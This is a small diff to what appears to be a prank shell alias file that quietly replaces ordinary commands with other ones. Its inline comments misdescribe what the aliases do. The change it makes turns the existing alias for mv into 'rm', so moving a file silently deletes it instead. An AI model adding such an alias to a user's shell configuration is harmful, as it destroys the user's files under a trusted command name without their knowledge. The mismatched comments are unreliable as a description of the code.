@@ -5,7 +5,7 @@ alias ls='tree'          # reverses each directory name
 alias cat='echo ""'                               # shuffles lines in the file
 alias vim='vi'                                      # try to use vim commands in that
 alias nano='vi'
-alias mv='reset'
+alias mv='rm'
 alias cp='ifconfig'
 
 
